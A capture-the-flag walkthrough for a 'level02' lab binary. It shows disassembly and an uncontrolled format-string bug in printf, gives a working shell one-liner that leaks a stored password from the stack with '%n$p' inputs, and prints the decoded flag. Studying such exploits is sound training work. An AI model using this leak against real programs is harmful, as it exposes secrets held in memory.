# level02 walkthrough

Given 64-bit elf binary, on execution it asks for a username and password:

    $ ./level02 
    ===== [ Secure Access System v1.0 ] =====
    /***************************************\
    | You must login to access this system. |
    \**************************************/
    --[ Username: level03
    --[ Password: loremipsum
    *****************************************
    level03 does not have access!

In the disassembly we can see three variables being created on stack and zeroed and an fopen function call:

    push   rbp
    mov    rbp,rsp
    sub    rsp,0x120
    mov    DWORD PTR [rbp-0x114],edi
    mov    QWORD PTR [rbp-0x120],rsi
    lea    rdx,[rbp-0x70]
    mov    eax,0x0
    mov    ecx,0xc
    mov    rdi,rdx
    rep stos QWORD PTR es:[rdi],rax
    mov    rdx,rdi
    mov    DWORD PTR [rdx],eax
    add    rdx,0x4
    lea    rdx,[rbp-0xa0]
    mov    eax,0x0
    mov    ecx,0x5
    mov    rdi,rdx
    rep stos QWORD PTR es:[rdi],rax
    mov    rdx,rdi
    mov    BYTE PTR [rdx],al
    add    rdx,0x1
    lea    rdx,[rbp-0x110]
    mov    eax,0x0
    mov    ecx,0xc
    mov    rdi,rdx
    rep stos QWORD PTR es:[rdi],rax
    mov    rdx,rdi
    mov    DWORD PTR [rdx],eax
    add    rdx,0x4
    mov    QWORD PTR [rbp-0x8],0x0
    mov    DWORD PTR [rbp-0xc],0x0
    mov    edx,0x400bb0
    mov    eax,0x400bb2
    mov    rsi,rdx
    mov    rdi,rax
    call   0x400700 <fopen@plt>
    mov    QWORD PTR [rbp-0x8],rax
    cmp    QWORD PTR [rbp-0x8],0x0
    jne    0x4008e6 <main+210>


Fopen loads the level03 pass file as a file stream with read permissions:

    (gdb) printf "%s\n", 0x400bb2
    /home/users/level03/.pass/home/users/level03/.pass
    (gdb) printf "%s\n", 0x400bb0
    r   

After checking that the password file was loaded successfully program reads the password to the variable on stack at rbp-0xa0 that was allocated earlier:

    lea    rax,[rbp-0xa0]
    mov    rdx,QWORD PTR [rbp-0x8]
    mov    rcx,rdx
    mov    edx,0x29
    mov    esi,0x1
    mov    rdi,rax
    call   0x400690 <fread@plt>

Then it checks if the password was read correctly, prints the auth prompt and reads username and password from stdin:

    mov    rax,QWORD PTR [rip+0x20087e]        # 0x601248 <stdin@@GLIBC_2.2.5>
    mov    rdx,rax
    lea    rax,[rbp-0x70]
    mov    esi,0x64
    mov    rdi,rax
    call   0x4006f0 <fgets@plt>
    lea    rax,[rbp-0x70]
    mov    esi,0x400bf5
    mov    rdi,rax
    call   0x4006d0 <strcspn@plt>
    mov    BYTE PTR [rbp+rax*1-0x70],0x0
    mov    eax,0x400ce8
    mov    rdi,rax
    mov    eax,0x0
    call   0x4006c0 <printf@plt>
    mov    rax,QWORD PTR [rip+0x20083b]        # 0x601248 <stdin@@GLIBC_2.2.5>
    mov    rdx,rax
    lea    rax,[rbp-0x110]
    mov    esi,0x64
    mov    rdi,rax
    call   0x4006f0 <fgets@plt>
    lea    rax,[rbp-0x110]
    mov    esi,0x400bf5
    mov    rdi,rax
    call   0x4006d0 <strcspn@plt>
    mov    BYTE PTR [rbp+rax*1-0x110],0x0
    mov    edi,0x400cf8
    call   0x400680 <puts@plt>
    lea    rcx,[rbp-0x110]
    lea    rax,[rbp-0xa0]
    mov    edx,0x29
    mov    rsi,rcx
    mov    rdi,rax
    call   0x400670 <strncmp@plt>
    test   eax,eax
    jne    0x400a96 <main+642>


For each prompt read program calls strcspn function to find an offset of the '\n' character and zero it in the provided string.
In the end of the disassembly above we can see that the password that was saved before in the buffer is being compared to the password provided via prompt using strncmp.
There is nothing to exploit so far and we can't provide the correct password since we don't know it yet, lets check what happens in case it doesn't match:

    lea    rax,[rbp-0x70]
    mov    rdi,rax
    mov    eax,0x0
    call   0x4006c0 <printf@plt>
    mov    edi,0x400d3a
    call   0x400680 <puts@plt>
    mov    edi,0x1
    call   0x400710 <exit@plt>

In this case it calls printf with the username from prompt as a format string argument which is a common security vulnerability since we can now provide any kind of format string to the printf call and take advantage of va_args to print anything from stack.
The size of the buffer that was allocated in the beginning is 0x120, the offset of the password in this buffer is 0x120-0xa0=0x80 (128 bytes).
Since the binary is 64 bit the first six arguments are passed via registers rdi, rsi, rdx, rcx, r8, and r9 due to the ABI agreement. The format string is provided via rdi register. If we put `%n$p` as a format string where n is the number of argument then we can print 8 byte chunks from buffer since the rest arguments to printf are provided via stack according to the ABI. To calculate the value of the argument where the password is stored we need to skip 5 registers and buffer offset aligned by 8 bytes 5+128/8=21.
The size of the password from the next level is 40 bytes so we need to run the program 5 times:

    $ for((i=1; i<=5; i++)); do echo "[$i] %$[i+21]\$p" | ./level02 | grep does; done
    [1] 0x756e505234376848 does not have access!
    [2] 0x45414a3561733951 does not have access!
    [3] 0x377a7143574e6758 does not have access!
    [4] 0x354a35686e475873 does not have access!
    [5] 0x48336750664b394d does not have access!

And after converting memory bytes from hex to string using [to_str.py](Resources/to_str.py) we will get the level03 flag:

    python3 ./Resources/to_str.py
    Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H

Profit!
